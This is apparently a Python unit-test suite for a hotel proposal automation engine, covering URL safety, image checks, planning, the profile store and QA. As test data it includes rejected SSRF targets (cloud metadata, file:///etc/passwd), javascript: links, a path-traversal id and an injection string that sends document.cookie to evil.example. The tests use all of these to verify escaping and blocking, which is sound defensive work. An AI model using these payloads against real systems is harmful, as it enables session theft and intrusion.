"""Unit tests for the hotel-specific automation engine: network safety, assets, customization/plan, profile store, mapping, QA.
Run: python3 test/test_engine.py   (no browser, no Hippo; a throwaway local HTTP server stands in for hotel image hosts)"""
import copy, http.server, json, os, sys, tempfile, threading

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "agent"))
for k in ("ALLOW_PRIVATE_HOSTS", "ALLOW_HTTP", "ALLOWED_HOTEL_DOMAINS", "ASSET_CHECK_POLICY", "ASSET_RIGHTS_POLICY"): os.environ.pop(k, None)
import netsafe as N, assets as AS, customize as CU, hotel_profile as HP, mapping as MP, qa as QA, dealroom_builder as B, scrape_to_config as S2C, photos as PH   # noqa: E402

passed = 0
def ok(cond, name):
    global passed
    if not cond: raise AssertionError(name)
    passed += 1; print("  ✔", name)

def raises(exc, fn):
    try: fn()
    except exc: return True
    return False


# ------------------------------------------------------------------ network safety
print("netsafe")
for url, why in [("https://user:pw@example.com/x", "credentials"), ("https://127.0.0.1/x", "loopback"), ("https://localhost/x", "localhost"), ("https://10.1.2.3/x", "private 10/8"),
                 ("https://192.168.0.5/", "private 192.168/16"), ("https://169.254.169.254/latest/meta-data", "cloud metadata"), ("https://[::1]/", "ipv6 loopback"),
                 ("https://[::ffff:127.0.0.1]/", "ipv4-mapped loopback"), ("https://100.64.0.1/", "carrier-grade NAT"), ("https://example.com:8443/", "odd port"),
                 ("file:///etc/passwd", "file scheme"), ("ftp://example.com/x", "ftp scheme"), ("javascript:alert(1)", "javascript scheme"), ("http://example.com/", "plain http")]:
    ok(raises(N.Unsafe, lambda: N.check_url(url, resolve=False)), f"rejects {why}: {url}")
ok(N.check_url("https://www.example.com/hotels/x", resolve=False).hostname == "www.example.com", "accepts an ordinary https hotel URL")
ok(raises(N.Unsafe, lambda: N.check_url("https://evil.com\\.allowed.com/x", resolve=False)) and raises(N.Unsafe, lambda: N.check_url("https://example.com/a\nb", resolve=False)), "rejects a backslash or control character (Python and Chromium would read the host differently)")
ok(N.host_is_public("no-such-host.invalid") and not N.host_is_public("no-such-host.invalid", fail_closed=True), "an unresolvable name passes for our own requests but is refused for Chromium (fail closed)")
ok(N.same_site("www.hotel.com", "hotel.com") and N.same_site("book.hotel.com", "hotel.com") and not N.same_site("hotel.com", "evil-hotel.com") and not N.same_site("hotel.com", ""), "same_site: www/subdomain yes, look-alike domain no")
png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + (640).to_bytes(4, "big") + (480).to_bytes(4, "big") + b"\x08\x02\x00\x00\x00"
gif = b"GIF89a" + (320).to_bytes(2, "little") + (200).to_bytes(2, "little") + b"\x00\x00\x00"
jpg = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xc0\x00\x11\x08" + (900).to_bytes(2, "big") + (1600).to_bytes(2, "big") + b"\x03\x01\x22\x00\x02\x11\x01\x03\x11\x01"
ok(N.image_size(png) == ("image/png", 640, 480) and N.image_size(gif) == ("image/gif", 320, 200) and N.image_size(jpg) == ("image/jpeg", 1600, 900) and N.image_size(b"<html>")[0] is None, "image_size reads PNG, GIF and JPEG headers")


class Handler(http.server.BaseHTTPRequestHandler):
    hits = {}
    def log_message(self, *a): pass
    def do_GET(self):
        Handler.hits[self.path] = Handler.hits.get(self.path, 0) + 1
        n = Handler.hits[self.path]
        if self.path == "/ok.png": return self.send(200, png, "image/png")
        if self.path == "/big.png": return self.send(200, png, "image/png")
        if self.path == "/same.png": return self.send(200, png, "image/png")
        if self.path == "/flaky.png": return self.send(503, b"", "text/plain") if n <= 2 else self.send(200, png, "image/png")
        if self.path == "/always503.png": return self.send(503, b"", "text/plain")
        if self.path == "/page.html": return self.send(200, b"<html>not an image</html>", "text/html")
        if self.path == "/redirect-private": self.send_response(302); self.send_header("Location", "http://169.254.169.254/x"); self.end_headers(); return
        if self.path == "/robots.txt": return self.send(200, b"User-agent: *\nDisallow: /private/\n", "text/plain")
        self.send(404, b"nope", "text/plain")
    def send(self, code, body, ctype):
        self.send_response(code); self.send_header("Content-Type", ctype); self.send_header("Content-Length", str(len(body))); self.end_headers(); self.wfile.write(body)

srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler); threading.Thread(target=srv.serve_forever, daemon=True).start()
BASE = f"http://127.0.0.1:{srv.server_address[1]}"
os.environ.update(ALLOW_HTTP="1", ALLOW_PRIVATE_HOSTS="1")
ok(N.fetch(BASE + "/ok.png")[0] == 200, "fetch returns a 200 response")
ok(raises(N.Transient, lambda: N.fetch(BASE + "/always503.png")), "5xx is reported as transient (retryable)")
ok(N.fetch(BASE + "/missing")[0] == 404, "4xx is returned, not raised: the caller decides")
rp = N.robots_for(BASE + "/x")
ok(not N.robots_allows(rp, BASE + "/private/room") and N.robots_allows(rp, BASE + "/public"), "robots.txt: disallowed path blocked, others allowed")
ok(N.robots_allows(None, BASE + "/anything"), "no robots.txt means no restrictions")
real = N.host_is_public
N.host_is_public = lambda h, resolve=True: h == "127.0.0.1"                    # only the first hop is "public": a redirect into the metadata address must be stopped
ok(raises(N.Unsafe, lambda: N.fetch(BASE + "/redirect-private")), "a redirect into a private address is stopped at the hop, not followed")
N.host_is_public = real


# ------------------------------------------------------------------ assets
print("assets")
r = AS.check_one(BASE + "/ok.png", None)
ok(r["ok"] and r["width"] == 640 and r["height"] == 480 and r["content_type"] == "image/png" and len(r["sha256"]) == 64, "a good image: type, dimensions and sha256 recorded")
AS.time.sleep = lambda s: None                                                  # keep the retry test fast
r = AS.check_one(BASE + "/flaky.png", None)
ok(r["ok"] and Handler.hits["/flaky.png"] == 3, "transient failures are retried, then succeed (3 requests)")
before = Handler.hits["/always503.png"]
r = AS.check_one(BASE + "/always503.png", None)
ok(not r["ok"] and r["transient"] and Handler.hits["/always503.png"] - before == AS.RETRIES + 1, "retries are bounded; exhausted ones are flagged transient")
r = AS.check_one(BASE + "/gone.png", None)
ok(not r["ok"] and not r["transient"] and r["status"] == 404, "a 404 fails at once and is not retried")
ok(not AS.check_one(BASE + "/page.html", None)["ok"], "an HTML page served as an image is rejected")
recs = AS.check_assets([BASE + "/ok.png", BASE + "/same.png", BASE + "/gone.png"], None)
h = {"media": {"a_1": {"source_url": BASE + "/ok.png"}, "a_2": {"source_url": BASE + "/same.png"}, "a_3": {"source_url": BASE + "/gone.png"}},
     "slots": {"fits": ["a_3"], "gallery": ["a_1", "a_2", "a_3"]}}
h2, notes = AS.prune_media(h, recs, "enforce")
ok(list(h2["media"]) == ["a_1"] and h2["slots"]["gallery"] == ["a_1"], "broken and duplicate photos are dropped (same picture under two URLs kept once)")
ok(h2["slots"]["fits"] == ["a_1"] and any("fits" in n for n in notes), "a slot left empty is refilled with a working photo and says so")
ok(AS.prune_media(h, recs, "warn")[0]["media"].keys() == h["media"].keys(), "policy warn removes nothing")
hh = {"media": {"a_1": {"source_url": BASE + "/gone.png"}, "u_1": {"source_url": BASE + "/ok.png"}}, "slots": {"fits": ["a_1"]}}
ok(AS.prune_media(hh, {BASE + "/gone.png": {"ok": False, "error": "HTTP 404"}}, "enforce")[0]["slots"]["fits"] == [], "a photo that was never verified is not used to fill an emptied slot")
c = {u: r for u, r in recs.items() if r["ok"]}
for r in c.values(): r["_ts"] = 9e12
ok(all(x.get("cached") for x in AS.check_assets(list(c), None, cache=c).values()), "fresh successful results are reused from the cache, not downloaded again")
before = Handler.hits["/ok.png"]; AS.check_assets([BASE + "/ok.png"], None, cache=c)
ok(Handler.hits["/ok.png"] == before, "a cached asset triggers no request")
os.environ.pop("ALLOW_PRIVATE_HOSTS"); os.environ.pop("ALLOW_HTTP")


# ------------------------------------------------------------------ customization + plan
print("customization")
ok(all(sorted(f["order"]) == sorted(CU.KEYS) and f["order"][0] == "overview" and f["order"][-1] == "next_steps" for f in CU.FAMILIES.values()), "every template family lists every section once, overview first and next steps last")
ok(CU.FAMILIES["standard"]["order"] == B.DEFAULT_ORDER, "the standard family is exactly the builder's reference order")
n, e = CU.validate_customization({"template_family": "premium", "preferred_sections": ["Meetings", "Suites", "meetings"], "cta_buttons": ["download_pdf"], "branding": {"primary": "#abc", "body_font": "dm sans"}})
ok(not e and n["preferred_sections"] == ["meeting", "rooms"] and n["branding"] == {"primary": "#AABBCC", "body_font": "DM Sans"} and n["cta_buttons"] == ["download_pdf"], "validation normalises aliases, de-duplicates, upper-cases colours, names fonts")
for bad, why in [({"nope": 1}, "unknown key"), ({"template_family": "fancy"}, "unknown family"), ({"focus": "party"}, "unknown focus"), ({"preferred_sections": ["Spa Day"]}, "unknown section"),
                 ({"exclude_sections": ["overview"]}, "excluding the overview"), ({"exclude_sections": ["next steps"]}, "excluding next steps"),
                 ({"preferred_sections": ["rooms"], "exclude_sections": ["rooms"]}, "preferred and excluded"), ({"branding": {"primary": "red"}}, "named colour"),
                 ({"branding": {"heading_font": "Comic Neue Pro"}}, "unsupported font"), ({"cta_buttons": []}, "no buttons"), ({"cta_buttons": ["buy_now"]}, "unknown button"),
                 ({"include_gallery": "yes"}, "non-boolean"), ({"on_unavailable": "ignore"}, "bad policy"), ({"special_notes": "x" * 501}, "long notes"), ({"asset_rights": {"approved": "yes"}}, "bad rights"),
                 ({"rfp_needs": {"rooms": "no"}}, "bad rfp needs"), ("text", "not an object")]:
    ok(CU.validate_customization(bad)[1], f"rejects {why}")
ok(CU.validate_customization(None) == ({}, []) and CU.validate_customization({}) == ({}, []), "no customization is valid and empty")
v1 = CU.effective({"focus": "rooms"}, {"focus": "event"}, {"include_gallery": False})
ok(v1[0] == {"focus": "event", "include_gallery": False} and v1[1] == CU.effective({"focus": "rooms"}, {"focus": "event"}, {"include_gallery": False})[1] and v1[1] != CU.effective({}, {"focus": "event"}, {})[1],
   "saved < request < reviewer layering; the customization version is a stable hash")

HOTEL = {"hotel_id": "demo-hotel-12345678", "profile_version": 1, "venues": [{"name": "Ballroom"}]}
H = {"slug": "demo-hotel", "name": "Demo Hotel", "location_tag": "Paris", "address": "1 Rue Demo, Paris", "brand": {"primary": "#123456", "dark": "#0B1F33", "tint": "#F5F5F5", "accent": "#AABBCC", "text": "#111111"},
     "fonts": {"heading": {"stack": "Georgia, serif", "transform": "none", "letter_spacing": "normal", "site_font": "Georgia", "web_font": "Open Sans"}, "body": {"stack": "Arial, sans-serif", "button_font": "Arial", "site_font": "Arial", "web_font": "Open Sans"}},
     "logos": [{"url": "https://example.com/logo.png", "logo_type": "your_logo"}],
     "media": {"fits_1": {"source_url": "https://example.com/hotel-hero.jpg", "hippo": None}, "gallery_1": {"source_url": "https://example.com/gallery-1.jpg", "hippo": None}},
     "slots": {"fits": ["fits_1"], "gallery": ["gallery_1"], "rooms": ["gallery_1"], "meeting": ["gallery_1"], "dining": ["gallery_1"], "amenities": ["gallery_1"]},
     "map": {"query": "Paris"}, "overview": "A hotel with a stylish look.", "fits": [{"icon": "house", "title": "City centre", "body": "Walkable location"}],
     "rooms_intro": "Beautiful rooms.", "meeting_intro": "Meetings available.", "venues": {"rows": [["Ballroom", "300 sq m", "200"]], "columns": ["Venue", "Area", "Theatre"]},
     "dining_intro": "Dining options.", "av_support": "AV available.", "location_intro": "In the city centre.", "location_cards": [{"icon": "house", "title": "Getting here", "body": "Near the station."}],
     "amenities_line": "Pool", "room_types": {"columns": ["Room type", "Size", "Guests"], "rows": [["Deluxe King", "30 sq m", "2"], ["Garden Suite", "55 sq m", "4"]]}, "featured_video": None}
keys = lambda p: [s["key"] for s in p["sections"]]
plan = lambda c, h=H, cp=None, profile=HOTEL: CU.make_plan(profile, h, cp or {}, CU.validate_customization(c)[0], "v1")
p0 = plan({})
ok(p0["template_family"] == "standard" and keys(p0) == B.DEFAULT_ORDER and not p0["omitted"] and not p0["unmet_requests"] and not p0["blocking"], "no customization: the standard family and every section")
ok(json.dumps(plan({"focus": "event", "exclude_sections": ["concessions"]}), sort_keys=True) == json.dumps(plan({"focus": "event", "exclude_sections": ["concessions"]}), sort_keys=True), "the plan is deterministic")
p = plan({"focus": "event"})
ok(p["template_family"] == "corporate_event" and p["family_source"] == "focus" and keys(p)[:3] == ["overview", "fits", "meeting"], "event focus puts meeting space ahead of rooms")
ok(plan({"focus": "meetings"})["template_family"] == "meeting_space", "meetings focus selects the meeting-space family when venues exist")
ok(plan({"focus": "meetings"}, profile={**HOTEL, "venues": []})["template_family"] == "corporate_event", "meetings focus falls back to corporate_event when no venue capacities were published")
p = plan({"template_family": "meeting_space"}, profile={**HOTEL, "venues": []})
ok(p["blocking"] and p["blocking"][0]["category"] == "UNSUPPORTED_TEMPLATE", "explicitly asking for a family the hotel's data cannot support blocks, naming the missing data")
p = plan({"preferred_sections": ["Meetings", "Pricing"], "exclude_sections": ["Concessions", "av"]})
ok(keys(p)[:3] == ["overview", "meeting", "pricing"] and keys(p)[-1] == "next_steps" and "concessions" not in keys(p) and "av" not in keys(p), "preferred sections move up after the overview; excluded ones vanish; next steps stays last")
p = plan({"rfp_needs": {"rooms": False, "meeting": True, "concessions": False, "av": False, "dining_info": False}})
ok(not {"rooms", "concessions", "av", "dining"} & set(keys(p)) and "meeting" in keys(p) and all(o["code"] == "RFP_NOT_NEEDED" for o in p["omitted"]), "RFP needs switch sections off")
p = plan({"rfp_needs": {"rooms": False}, "preferred_sections": ["rooms"]})
ok("rooms" in keys(p), "an explicit preference beats a derived 'not needed'")
p = plan({}, h={**H, "fits": []})
ok("fits" not in keys(p) and p["omitted"][0]["code"] == "NO_CONTENT", "a hotel-content-only section with nothing sourced behind it is omitted, with the reason recorded")
p = plan({"on_unavailable": "block"}, h={**H, "fits": []})
ok(p["blocking"] and p["blocking"][0]["category"] == "REQUIRED_INFO_MISSING", "policy 'block' turns the same gap into a blocking exception")
p = plan({"preferred_sections": ["fits"]}, h={**H, "fits": []})
ok(p["unmet_requests"] and "fits" in p["unmet_requests"][0]["request"].lower(), "a requested section that cannot be populated is an unmet request, not silently dropped")
p = plan({"include_gallery": False, "include_tour_videos": False})
ok("gallery" not in keys(p), "gallery images and tour videos both off removes the section")
p = plan({"include_gallery": False})
ok("gallery" in keys(p) and p["flags"]["gallery_images"] is False and p["flags"]["tour_video_slot"] is True, "gallery images off keeps the section for the video")
p = plan({"include_tour_videos": True})
ok(p["unmet_requests"] and p["unmet_requests"][0]["request"] == "tour videos", "tour videos requested with no approved video asset is an unmet request")
p = plan({"include_tour_videos": True}, h={**H, "featured_video": {"hippo": {"id": 1}}})
ok(not p["unmet_requests"] and p["flags"]["featured_video"], "tour videos requested with an approved video asset: included")
p = plan({"include_testimonials": True})
ok(p["unmet_requests"] and p["unmet_requests"][0]["request"] == "testimonials", "testimonials are never invented: requested ones are an unmet request")
p = plan({"emphasize_rooms": ["garden suite", "Penthouse"]})
ok(p["flags"]["emphasize_rooms"] == ["Garden Suite"] and any("Penthouse" in u["request"] for u in p["unmet_requests"]), "emphasised rooms found by exact name; unknown ones reported")
ok(CU.apply_emphasis(H, ["Garden Suite"])["room_types"]["rows"][0][0] == "Garden Suite" and H["room_types"]["rows"][0][0] == "Deluxe King", "emphasis reorders a copy and never merges or renames rooms")
p = plan({"special_notes": "Prioritize the property tour and meeting spaces"})
ok(p["special_notes"].startswith("Prioritize") and keys(p) == B.DEFAULT_ORDER, "free-text notes are kept for the reviewer but never change the plan")
hb = CU.apply_branding(H, {"accent": "#B8860B", "heading_font": "Lora"})
ok(hb["brand"]["accent"] == "#B8860B" and hb["fonts"]["heading"]["web_font"] == "Lora" and "Lora" in hb["fonts"]["heading"]["stack"] and H["brand"]["accent"] == "#AABBCC", "branding tokens are applied to a copy")


# ------------------------------------------------------------------ builder with a plan
print("builder + plan")
tpl_all, _, _ = B.build(H)
ok([s["name"] for s in tpl_all["sections"]] == ["Overview", "Why This Hotel Fits", "Guest Rooms", "Concessions & Value Adds", "Meeting Space", "Pricing Summary", "Food & Beverage", "Amenities & Fees", "AV & Technology", "Location & Destination", "Virtual Tour & Gallery", "Proposal PDF", "Next Steps"], "no plan: all 13 sections in the reference order (unchanged behaviour)")
pl = plan({"focus": "event", "exclude_sections": ["concessions"], "include_tour_videos": False, "cta_buttons": ["schedule_site_visit", "download_pdf"], "include_gallery": True})
tpl, checks, P, binds = B.build_full(H, pl)
ok([s["id"] for s in tpl["sections"]] == [B.SECTION_ID_BY_KEY[k] for k in keys(pl)] and len(tpl["sections"]) == 12, "the built sections are exactly the planned ones, in plan order")
ok(tpl["sideNav"][0]["sections"] == [s["id"] for s in tpl["sections"]] and [s["order"] for s in tpl["sections"]] == list(range(1, 13)), "sideNav and ordering follow the plan")
ok([b["text"] for b in tpl["header_cta_buttons"]] == ["<b>Schedule Site Visit</b>", "<b>Download Proposal PDF</b>"], "header CTAs follow the plan")
gal = next(s for s in tpl["sections"] if s["id"] == B.SECTION_ID_BY_KEY["gallery"])
ok(all(a["id"] != "virtual_tour_video" for c in gal["components"] if c["type"] == "Carousel" for a in c["data"]["assets"]), "tour video switched off: the dynamic video slot is not in the gallery")
errs, _, _ = B.validate(tpl, H, checks)
ok(not errs, "a planned template passes the builder's own validation: %s" % errs)
ok(len(binds) > 15 and all({"section", "slot", "config_key", "required"} <= set(b) for b in binds) and not {"rooms"} & {b["section"] for b in binds if b["section"] == "concessions"}, "the builder reports which hotel field fed each slot")
ok(B.required_for(["overview", "next_steps"]) == B.REQUIRED_GLOBAL and "fits" in B.required_for(["fits"]), "required fields follow the planned sections")
hh = {k: v for k, v in H.items() if k not in ("rooms_intro", "meeting_intro", "dining_intro", "av_support", "amenities_line")}
t2, c2, _ = B.build(hh)
ok(not B.validate(t2, hh, c2)[0], "optional intros left out: the blocks are omitted, nothing is made up")


hostile = 'X"); fetch("https://evil.example/c?"+document.cookie); (" \u2028 \n// ' + "`${alert(1)}`"
js = B.make_loader({"sections": []}, "1605252", hostile, "Email")
lit = next(l for l in js.splitlines() if l.strip().startswith("const LABEL = "))
ok(json.loads(lit.split("=", 1)[1].strip().rstrip(";")) == hostile, "loader.js carries the hotel name as one escaped data literal, byte for byte")
hits = [l for l in js.splitlines() if "evil.example" in l]
ok(all(l == lit or l.startswith("// Hippo deal room loader:") for l in hits) and js.splitlines()[1].startswith("// Run in the browser Console"), "and nowhere else: only in that literal and a one-line header comment that cannot be broken out of")
import subprocess as _sp
open(os.path.join(tempfile.mkdtemp(), "x"), "w").close()
_f = os.path.join(tempfile.mkdtemp(), "loader.js"); open(_f, "w").write(js)
ok(_sp.run(["node", "--check", _f], capture_output=True).returncode == 0, "the generated loader is still valid JavaScript with a hostile name")

# ------------------------------------------------------------------ hotel profile store
print("hotel profile")
i1 = HP.hotel_identity("https://www.tajhotels.com/en-in/hotels/jai-mahal-palace-jaipur/meetings/?utm_source=x")
i2 = HP.hotel_identity("https://tajhotels.com/en-us/hotels/jai-mahal-palace-jaipur")
i3 = HP.hotel_identity("https://www.tajhotels.com/en-in/hotels/rambagh-palace-jaipur")
ok(i1["hotel_id"] == i2["hotel_id"] and i1["hotel_id"] != i3["hotel_id"] and i1["hotel_id"].startswith("jai-mahal-palace-jaipur-"), "hotel id: same hotel across www, locale and sub-pages; a different hotel gets a different id")
ok(HP.HOTEL_ID.match(i1["hotel_id"]) and HP.HOTEL_ID.match(HP.hotel_identity("https://hotel.example/")["hotel_id"]), "hotel ids are safe directory names")
tmp = tempfile.mkdtemp(); store = HP.Store(tmp)
prof = lambda **kw: {"schema": 1, "hotel_id": "demo-hotel-12345678", "property_name": "Demo Hotel", "evidence": [], "assets": [], "source_verification": {}, "profile_version": 0, "profile_status": "draft",
                     "content_hash": kw.pop("hash", "h1"), **kw}
a = store.save(prof()); b = store.save(prof()); c = store.save(prof(hash="h2"))
ok(a["profile_version"] == 1 and b["profile_version"] == 1 and c["profile_version"] == 2, "identical content keeps the version; changed content makes a new one")
ok(store.get("demo-hotel-12345678", 1)["content_hash"] == "h1" and store.get("demo-hotel-12345678")["profile_version"] == 2 and store.index("demo-hotel-12345678")["latest_version"] == 2, "every version is kept; profile.json is the latest")
ap = store.approve("demo-hotel-12345678", 2, "ops")
ok(ap["profile_status"] == "approved" and ap["approved_by"] == "ops" and store.index("demo-hotel-12345678")["approved_version"] == 2 and store.get("demo-hotel-12345678", 1)["profile_status"] == "draft", "approving one version leaves the others as drafts")
store.record_generation("demo-hotel-12345678", {"job_id": "dr_x_00000000", "profile_version": 2})
ok(store.generations("demo-hotel-12345678")[0]["job_id"] == "dr_x_00000000", "generations are recorded")
store.save_customization("demo-hotel-12345678", {"asset_rights": {"approved": True}, "focus": "event"}, "v", "lead")
sc = store.customization("demo-hotel-12345678")
ok(sc["asset_rights"]["approved_by"] == "lead" and sc["asset_rights"]["approved_at"] and sc["focus"] == "event", "saved customization records who approved asset rights, and when")
first_at = sc["asset_rights"]["approved_at"]
store.save_customization("demo-hotel-12345678", {**sc, "focus": "rooms"}, "v2", "an-operator")
sc2 = store.customization("demo-hotel-12345678")
ok(sc2["asset_rights"]["approved_by"] == "lead" and sc2["asset_rights"]["approved_at"] == first_at and sc2["focus"] == "rooms", "re-saving other fields does not re-stamp who approved the rights")
store.save_customization("demo-hotel-12345678", {"asset_rights": {"approved": False}}, "v3", "lead")
store.save_customization("demo-hotel-12345678", {"asset_rights": {"approved": True, "approved_by": "forged"}}, "v4", "another-admin")
ok(store.customization("demo-hotel-12345678")["asset_rights"]["approved_by"] == "another-admin", "a new approval is stamped by the server, whatever the request claims")
store.save({**prof(hash="o1"), "hotel_id": "other-hotel-aaaaaaaa", "property_name": "The Other Grand Hotel"})
ok(store.others("demo-hotel-12345678") == [("other-hotel-aaaaaaaa", "The Other Grand Hotel")], "the store lists other hotels for cross-hotel leakage checks")
ok(raises(ValueError, lambda: store.path("../etc")), "a hotel id cannot escape the store directory")

good = {"property_name": "Demo Hotel", "official_website_url": "https://demo.example/hotels/demo", "address": "1 Rue Demo", "city": "Paris", "phone": "+33 1 23 45 67 89", "email": "a@b.co",
        "facts": {"checkin": "3:00 pm", "checkout": "12:00 pm"}, "rooms": [{"room_id": "room_1", "room_name": "King"}, {"room_id": "room_2", "room_name": "King"}],
        "venues": [{"venue_id": "venue_1", "name": "Hall", "area": "300 sq m", "capacities": {"Theatre": "200"}}], "assets": [],
        "source_verification": {"host": "demo.example", "scraped_host": "demo.example", "status": "verified"}, "evidence": [{"field_key": k, "confidence_score": 0.9} for k in HP.REQUIRED if k != "official_website_url"]}
v = HP.validate_profile(good)
ok(v["ok"] and v["levels"]["1"] == "pass" and v["levels"]["3"] == "pass" and any(w["code"] == "DUPLICATE_RECORD" for w in v["warnings"]), "a complete profile passes; an exactly duplicated room name is flagged, not merged")
v = HP.validate_profile({**good, "address": "", "city": ""})
ok(not v["ok"] and set(v["critical"][0]["fields"]) == {"address", "city"} and v["critical"][0]["category"] == "REQUIRED_INFO_MISSING", "missing required fields are critical and named")
ok(not HP.validate_profile({**good, "source_verification": {"host": "demo.example", "scraped_host": "other-hotel.com", "status": "verified"}})["ok"], "a scrape from a different host than hotel_url is critical (foreign data)")
v = HP.validate_profile({**good, "source_verification": {"host": "demo.example", "status": "unverified"}})
ok(v["ok"] and any(w["code"] == "SOURCE_NOT_CONFIRMED" for w in v["warnings"]) and v["levels"]["3"] == "warn", "an unconfirmed official source is a review item, not a pass")
v = HP.validate_profile({**good, "phone": "call us", "venues": [{"venue_id": "v", "name": "Hall", "area": "300 sq m", "capacities": {"Theatre": "99999"}}], "facts": {"checkin": "11:00 am", "checkout": "12:00 pm"}})
codes = {w["code"] for w in v["warnings"]}
ok({"BAD_PHONE", "IMPLAUSIBLE_CAPACITY", "CHECKIN_BEFORE_CHECKOUT"} <= codes, "bad phone, implausible capacity and check-in not after check-out are caught")
ev = [{"field_key": "address", "confidence_score": 0.55}] + [{"field_key": k, "confidence_score": 0.9} for k in ("property_name", "city")]
ok(any(w["code"] == "LOW_CONFIDENCE" for w in HP.validate_profile({**good, "evidence": ev})["warnings"]), "a low-confidence required field asks for verification")
import time as _t
t0 = _t.time(); v = HP.validate_profile({**good, "email": "a@" + "." * 200000})
ok(_t.time() - t0 < 1 and any(w["code"] == "BAD_EMAIL" for w in v["warnings"]), "an enormous e-mail address is rejected by length before any regex runs")
ok(HP.content_hash({**good, "profile_version": 3, "built_at": "x"}) == HP.content_hash({**good, "profile_version": 9, "built_at": "y", "profile_status": "approved"}), "the content hash ignores version, status and timestamps")


# ------------------------------------------------------------------ mapping + QA
print("mapping and QA")
profile = {"hotel_id": "demo-hotel-12345678", "property_name": "Demo Hotel",
           "evidence": [{"field_key": k, "provenance": "officially_verified", "confidence_score": 0.9, "source_url": "https://demo.example/", "approval_status": "pending"} for k in ("property_name", "address", "city", "property_summary", "venues", "map")],
           "assets": [{"asset_id": "logo_1", "asset_type": "logo", "source_url": "https://example.com/logo.png", "usage_rights_status": "approved", "approval_status": "pending"},
                      {"asset_id": "fits_1", "asset_type": "photo", "source_url": "https://example.com/hotel-hero.jpg", "usage_rights_status": "approved", "approval_status": "pending"},
                      {"asset_id": "gallery_1", "asset_type": "photo", "source_url": "https://example.com/gallery-1.jpg", "usage_rights_status": "approved", "approval_status": "pending"}]}
pl0 = plan({})
tpl, checks, P, binds = B.build_full(H, pl0)
m = MP.build_mapping(H, pl0, profile, tpl, "email", binds, None)
dyn = {d["token"]: d["category"] for d in m["dynamic"]}
ok(dyn["${Guest Room Rate}"] == "commercial" and dyn["${Event Name}"] == "event" and dyn["${User.Email}"] == "contact" and dyn["${Hotel Name}"] == "hotel" and not m["errors"], "dynamic merge fields are classified; commercial and event fields are Hippo-supplied")
ok(all(d["fallback_policy"] == "hippo_supplied" for d in m["dynamic"]) and "approved opportunity" in next(d for d in m["dynamic"] if d["token"] == "${Guest Room Rate}")["supplied_by"], "commercial fields say they need an approved opportunity or pricing source")
st = {(s["section"], s["slot"]): s for s in m["static"]}
ok(st[("overview", "hero text")]["provenance"] == "officially_verified" and st[("overview", "hero text")]["source_field"] == "property_summary" and st[("meeting", "venue table")]["validation"] == "ok", "static bindings carry provenance, source and a validation result")
ok(st[("rooms", "room table")]["validation"] == "ok" and st[("amenities", "intro")]["validation"] == "ok", "bindings with values validate")
hh2 = {**H, "fits": []}
m2 = MP.build_mapping(hh2, pl0, profile, B.build_full({**H, "fits": [{"icon": "house", "title": "x", "body": "y"}]}, pl0)[0], "email", B.build_full({**H, "fits": [{"icon": "house", "title": "x", "body": "y"}]}, pl0)[3], None)
ok(any(e["code"] == "REQUIRED_BINDING_EMPTY" and e["category"] == "MERGE_FIELD_UNMAPPED" for e in m2["errors"]), "a required binding with no value is a mapping error that blocks")
bad_tpl = copy.deepcopy(tpl); bad_tpl["sections"][0]["components"][1]["data"]["cards"][0]["text"] += "${Made Up Field}"
ok(any(e["code"] == "UNKNOWN_MERGE_FIELD" for e in MP.build_mapping(H, pl0, profile, bad_tpl, "email", binds, None)["errors"]), "a token outside the flow's schema is a mapping error")

qa_in = dict(h=H, plan=pl0, profile=profile, pvalid={"critical": [], "warnings": []}, mapping=m, others=[], flow="email", rights="require", check="enforce")
imgs = {u: {"ok": True} for u in ("https://example.com/hotel-hero.jpg", "https://example.com/gallery-1.jpg")}
r = QA.run(tpl=tpl, assets=imgs, **qa_in)
ok(r["outcome"] == "PASS" and not r["critical"] and not r["review"] and {n["check"] for n in r["not_run"]} >= {"mobile_and_desktop_layout", "pdf_export", "share_link"}, "a clean deal room passes, and says plainly what QA could not check")
r = QA.run(tpl=tpl, assets={"https://example.com/hotel-hero.jpg": {"ok": False}, "https://example.com/gallery-1.jpg": {"ok": True}}, **qa_in)
ok(r["outcome"] == "FAIL" and any(x["code"] == "IMAGE_UNVERIFIED" for x in r["critical"]), "an unverified image in the deal room fails QA")
t3 = copy.deepcopy(tpl); t3["header_cta_buttons"][0]["link"] = "javascript:alert(1)"
r = QA.run(tpl=t3, assets=imgs, **qa_in)
ok(r["outcome"] == "FAIL" and any(x["code"] == "UNSAFE_LINK" for x in r["critical"]) and any(x["code"] == "CTA_MISMATCH" for x in r["critical"]), "a javascript: link fails QA, and a CTA that does not go where the plan says")
t4 = copy.deepcopy(tpl); t4["sections"][1]["components"][0]["data"]["text"] += "<p>Rooms from €250 per night</p>"
r = QA.run(tpl=t4, assets=imgs, **qa_in)
ok(r["outcome"] == "REVIEW" and any(x["category"] == "COMMERCIAL_APPROVAL" for x in r["review"]), "a price in hotel-owned text needs commercial approval (REVIEW, not PASS)")
t5 = copy.deepcopy(tpl); t5["sections"][1]["components"][0]["data"]["text"] += "<p>Stay at The Other Grand Hotel</p>"
r = QA.run(tpl=t5, assets=imgs, **{**qa_in, "others": [("other-hotel-aaaaaaaa", "The Other Grand Hotel")]})
ok(r["outcome"] == "FAIL" and any(x["code"] == "CROSS_HOTEL_LEAK" for x in r["critical"]), "another hotel's name in the text fails QA (cross-hotel leakage)")
prof2 = copy.deepcopy(profile); prof2["assets"][1]["usage_rights_status"] = "unverified"
r = QA.run(tpl=tpl, assets=imgs, **{**qa_in, "profile": prof2})
ok(r["outcome"] == "REVIEW" and any(x["category"] == "USAGE_RIGHTS_UNCLEAR" for x in r["review"]), "unverified asset rights need a person (REVIEW)")
r = QA.run(tpl=tpl, assets=imgs, **{**qa_in, "profile": prof2, "rights": "warn"})
ok(r["outcome"] == "PASS" and any(w["code"] == "ASSET_RIGHTS_UNVERIFIED" for w in r["warnings"]), "ASSET_RIGHTS_POLICY=warn lets it through but keeps the warning")
r = QA.run(tpl=tpl, assets={}, **{**qa_in, "check": "off"})
ok(r["outcome"] == "REVIEW" and any(x["code"] == "IMAGES_NOT_VERIFIED" for x in r["review"]), "with image checks off, images are never passed silently")
